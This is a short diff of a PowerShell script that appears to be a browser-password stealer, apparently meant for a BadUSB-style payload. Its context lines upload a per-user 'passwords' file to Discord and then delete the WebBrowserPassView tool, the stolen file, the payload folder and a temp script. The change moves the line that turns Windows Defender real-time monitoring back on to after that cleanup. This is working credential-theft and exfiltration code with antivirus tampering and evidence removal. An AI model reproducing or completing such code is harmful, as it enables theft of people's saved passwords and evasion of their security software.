@@ -40,11 +40,11 @@ Upload-Discord -file "passwords-$env:UserName$random.txt"
 
 Start-Sleep -seconds 1
 
-Set-MpPreference -DisableRealtimeMonitoring 0
-
 Remove-Item WebBrowserPassView.exe
 Remove-Item passwords-$env:UserName$random.txt
 cd..
 Remove-Item payloads
 Remove-Item C:\Users\$env:UserName\appdata\local\temp\passview.ps1
+
+Set-MpPreference -DisableRealtimeMonitoring 0
 exit
